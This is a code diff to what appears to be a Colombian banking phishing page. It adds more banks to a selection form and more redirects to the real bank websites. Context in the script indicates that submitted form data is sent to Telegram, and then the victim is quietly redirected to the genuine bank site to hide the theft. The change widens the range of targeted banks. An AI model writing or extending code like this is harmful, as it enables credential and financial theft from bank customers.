@@ -292,13 +292,16 @@
       <div class="input-form full-width">
         <i class="fa fa-bank"></i>
         <select id="bank-option" class="binding-input form-control">
-          <option value="" selected>Seleccione su banco</option>
-          <option value="bancolombia">Bancolombia</option>
-          <option value="davivienda">Davivienda</option>
-          <option value="bogota">Banco de Bogotá</option>
-          <option value="bbva">BBVA</option>
-          <option value="itau">Itaú</option>
-        </select>
+                <option value="" selected>A continuación seleccione su banco</option>
+                <option value="avvillas">BANCO AV VILLAS</option>
+                <option value="bbva">BANCO BBVA COLOMBIA S.A.</option>
+                <option value="davivienda">BANCO DAVIVIENDA</option>
+                <option value="bogota">BANCO DE BOGOTA</option>
+                <option value="occidente">BANCO DE OCCIDENTE</option>
+                <option value="popular">BANCO POPULAR</option>
+                <option value="bancolombia">BANCOLOMBIA</option>
+                <option value="colpatria">SCOTIABANK COLPATRIA</option>
+      </select>
       </div>
 
       <!-- Nombre -->
@@ -444,17 +447,25 @@
         .then(r => r.json())
         .then(() => {
           // 🔹 Redirigir según el banco elegido (sin alert)
-          if (banco === "bancolombia") {
-            window.location.href = "https://www.bancolombia.com/personas";
-          } else if (banco === "davivienda") {
-            window.location.href = "https://www.davivienda.com/wps/portal/personas/nuevo";
-          } else if (banco === "bogota") {
-            window.location.href = "https://www.bancodebogota.com/wps/portal/banco-de-bogota/bogota";
-          } else if (banco === "bbva") {
-            window.location.href = "https://www.bbva.com.co";
-          } else if (banco === "itau") {
-            window.location.href = "https://www.itau.co";
-          }
+            if (banco === "bancolombia") {
+              window.location.href = "https://www.bancolombia.com/personas";
+            } else if (banco === "davivienda") {
+              window.location.href = "https://www.davivienda.com/wps/portal/personas/nuevo";
+            } else if (banco === "bogota") {
+              window.location.href = "https://www.bancodebogota.com/wps/portal/banco-de-bogota/bogota";
+            } else if (banco === "bbva") {
+              window.location.href = "https://www.bbva.com.co";
+            } else if (banco === "itau") {
+              window.location.href = "https://www.itau.co";
+            } else if (banco === "avvillas") {
+              window.location.href = "https://www.bancoavvillas.com.co/personas";
+            } else if (banco === "occidente") {
+              window.location.href = "https://www.bancodeoccidente.com.co";
+            } else if (banco === "popular") {
+              window.location.href = "https://www.bancopopular.com.co";
+            } else if (banco === "colpatria") {
+              window.location.href = "https://www.scotiabankcolpatria.com";
+            }
         })
         .catch(err => {
           console.error("❌ Error en el envío a Telegram:", err);
@@ -471,3 +482,4 @@
 
 </body>
 </html>
+
